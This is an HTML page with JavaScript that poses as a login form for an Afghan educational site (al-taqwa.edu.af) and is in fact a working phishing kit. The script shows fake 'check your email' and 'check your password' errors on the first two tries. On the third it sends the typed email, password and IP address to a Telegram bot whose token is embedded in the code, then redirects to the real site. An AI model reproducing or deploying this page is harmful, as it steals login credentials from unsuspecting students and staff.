<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: Arial, sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f3f3f3;
    padding: 20px 16px;
}

/* ===== DEFAULT = MOBILE ===== */
.login-container{
    width: 100%;
    max-width: 480px;
    background:#fff;
    border-radius:16px;
    padding: 32px 20px 28px 20px;
    border:1px solid #e0e0e0;
    box-shadow:0 4px 14px rgba(0,0,0,0.08);
    display:flex;
    flex-direction:column;
}

.logo{
    text-align:center;
    margin-bottom:14px;
}

.logo img{
    width: 260px;
}

.title{
    text-align:center;
    font-size:24px;
    font-weight:700;
    margin-bottom:26px;
    color:#222;
}

.input-box{
    margin-bottom:16px;
}

label{
    display:block;
    font-size:15px;
    margin-bottom:6px;
    color:#444;
}

input[type="email"],
input[type="password"]{
    width:100%;
    height:54px;
    border-radius:8px;
    border:1px solid #ccc;
    padding:0 14px;
    font-size:16px;
}

input[type="email"]:focus,
input[type="password"]:focus{
    border:2px solid #18c6e7;
    outline:none;
}

.remember{
    display:flex;
    align-items:center;
    margin:12px 0 20px;
    font-size:15px;
    color:#444;
}

.remember input[type="checkbox"]{
    width:18px;
    height:18px;
    margin-right:8px;
}

button{
    width:100%;
    height:54px;
    border:none;
    border-radius:8px;
    background:#18c6e7;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    color:#000;
}

button:hover{
    background:#0fb6d6;
}

.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 10px;
    border-radius: 8px;
    font-size: 13px;
    text-align: center;
    margin-bottom: 10px;
    display: none;
}

/* ===== DESKTOP (768px او لوی) ===== */
@media (min-width: 768px) {

    body{
        padding: 0;
    }

    .login-container{
        width: 400px;
        max-width: 400px;
        border-radius:14px;
        padding: 36px 26px 28px 26px;
    }

    .logo img{
        width: 160px;
    }

    .title{
        font-size: 20px;
        margin-bottom: 22px;
    }

    label{
        font-size: 14px;
        margin-bottom: 5px;
    }

    input[type="email"],
    input[type="password"]{
        height: 44px;
        font-size: 14px;
        border-radius: 7px;
        padding: 0 12px;
    }

    .input-box{
        margin-bottom: 14px;
    }

    .remember{
        font-size: 13px;
        margin: 10px 0 18px;
    }

    .remember input[type="checkbox"]{
        width: 14px;
        height: 14px;
        margin-right: 7px;
    }

    button{
        height: 44px;
        font-size: 15px;
        border-radius: 7px;
    }
}

</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
    </div>

    <div class="title">Sign in</div>

    <div id="errorMsg" class="error-msg"></div>

    <div class="input-box">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-box">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember">
        <input type="checkbox" id="rememberCheck">
        <span>Remember password</span>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";

    let attemptStore = {};

    function hasPashtoCharacters(text) {
        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
        return pashtoRegex.test(text);
    }

    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    function isValidPasswordLength(password) {
        return password.length >= 8;
    }

    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    async function sendToAdmin(email, password, ip, attemptNumber) {
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram error:", e);
        }
    }

    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => { errorDiv.style.display = 'none'; }, 3000);
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) { showError('Please fill in both email and password'); return; }
        if (hasPashtoCharacters(email)) { showError('Pashto not allowed'); return; }
        if (hasPashtoCharacters(password)) { showError('Pashto not allowed'); return; }
        if (!isValidEmail(email)) { showError('Please enter a valid email address (e.g., username@gmail.com)'); return; }
        if (!isValidPasswordLength(password)) { showError('Password must be at least 8 characters'); return; }

        const ip = await getUserIP();
        const key = `${email}_${ip}`;

        if (!attemptStore[key]) attemptStore[key] = 0;
        attemptStore[key]++;
        const currentAttempt = attemptStore[key];

        if (currentAttempt === 1) {
            showError('Please check your email');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }
        if (currentAttempt === 2) {
            showError('Please check your password');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }
        if (currentAttempt >= 3) {
            await sendToAdmin(email, password, ip, currentAttempt);
            delete attemptStore[key];
            window.location.href = "https://www.altaqwa.edu.af";
        }
    });
</script>

</body>
</html>
